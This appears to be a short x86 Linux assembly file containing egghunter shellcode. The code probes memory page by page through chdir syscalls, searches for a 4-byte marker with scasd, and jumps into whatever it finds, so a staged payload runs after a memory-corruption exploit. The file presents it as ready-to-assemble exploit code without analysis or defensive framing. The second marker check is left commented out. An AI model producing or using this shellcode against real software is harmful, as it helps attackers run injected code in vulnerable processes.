
global _start			

section .text
_start:

    ; align page
    or dx, 0xfff

next:

    inc edx
    lea ebx, [edx+4]

    ; NR_chdir = 12
    ; int chdir(const char *path);
    ; EAX=12 EBX=*path
    push byte 12
    pop eax
    int 0x80

    ; EFAULT = 0xfffffff2
    cmp al,0xf2
    jz _start
    ; give credit to this trick
    mov eax, 0x50905090
    mov edi, edx
    ; compare EAX with ES:EDI
    scasd
    jnz next
    ;scasd
    ;jnz short next
    jmp edi

; vim: set ft=nasm:
